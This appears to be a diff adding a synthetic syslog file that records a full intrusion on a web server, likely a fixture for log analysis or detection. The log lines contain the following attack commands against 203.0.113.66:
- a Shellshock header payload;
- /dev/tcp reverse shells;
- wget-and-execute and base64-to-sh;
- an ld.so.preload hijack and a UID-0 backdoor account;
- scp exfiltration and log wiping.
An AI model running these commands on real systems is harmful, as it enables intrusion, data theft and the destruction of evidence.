@@ -1,0 +1,27 @@
+Feb 14 08:59:41 web01 systemd[1]: Started Session 512 of user deploy.
+Feb 14 08:59:42 web01 sshd[20111]: Accepted publickey for deploy from 10.20.0.14 port 51044 ssh2: RSA SHA256:9xM+
+Feb 14 09:00:03 web01 CRON[20140]: (root) CMD (/usr/local/bin/backup.sh)
+Feb 14 09:00:51 web01 apache2[19980]: 203.0.113.66 - - [14/Feb/2026:09:00:51 +0000] "GET /cgi-bin/status HTTP/1.1" 200 512 "() { :;}; /bin/bash -c 'wget http://203.0.113.66/b.sh -O /tmp/b.sh'" "curl/7.68.0"
+Feb 14 09:01:17 web01 sshd[20233]: Connection from 203.0.113.66 port 40122 on 10.20.0.9 port 22
+Feb 14 09:01:18 web01 sshd[20233]: fatal: buffer_get_string: bad string length 1128481346
+Feb 14 09:01:52 web01 sshd[20240]: Corrupted MAC on input.
+Feb 14 09:02:44 web01 kernel: [88123.114] TCP: request_sock_TCP: Possible SYN flooding on port 22.
+Feb 14 09:03:10 web01 sudo[20301]:    www-data : TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1'
+Feb 14 09:03:41 web01 sudo[20318]:    www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'exec 5<>/dev/tcp/203.0.113.66/9001; cat <&5'
+Feb 14 09:04:02 web01 systemd[1]: session-512.scope: Consumed 2.104s CPU time.
+Feb 14 09:04:55 web01 sudo[20355]:    www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'wget http://203.0.113.66/m.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh'
+Feb 14 09:05:12 web01 sudo[20361]:    www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo ZWNobyBwd25lZAo= | base64 -d | sh'
+Feb 14 09:05:48 web01 sudo[20377]:    www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/rootshell
+Feb 14 09:06:20 web01 sudo[20390]:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/ln -s /etc/passwd /tmp/.p
+Feb 14 09:06:59 web01 sudo[20402]:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo /tmp/.evil.so > /etc/ld.so.preload'
+Feb 14 09:07:33 web01 useradd[20440]: new user: name=support, UID=0, GID=0, home=/root, shell=/bin/bash
+Feb 14 09:07:34 web01 passwd[20441]: password for 'support' changed by 'root'
+Feb 14 09:08:10 web01 crontab[20466]: (root) REPLACE (root)
+Feb 14 09:08:11 web01 crontab[20466]: (root) BEGIN EDIT (root)
+Feb 14 09:09:04 web01 sudo[20501]:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/loot.tar.gz attacker@203.0.113.66:/data/
+Feb 14 09:09:48 web01 systemd[1]: Starting Daily apt download activities...
+Feb 14 09:10:22 web01 sudo[20544]:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'history -c; rm -f /root/.bash_history'
+Feb 14 09:10:59 web01 sudo[20560]:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'rm -rf /var/log/syslog'
+Feb 14 09:11:20 web01 systemd[1]: Finished Daily apt download activities.
+Feb 14 09:12:07 web01 sshd[20233]: Received disconnect from 203.0.113.66 port 40122:11: disconnected by user
+Feb 14 09:15:00 web01 CRON[20701]: (root) CMD (/usr/local/bin/backup.sh)
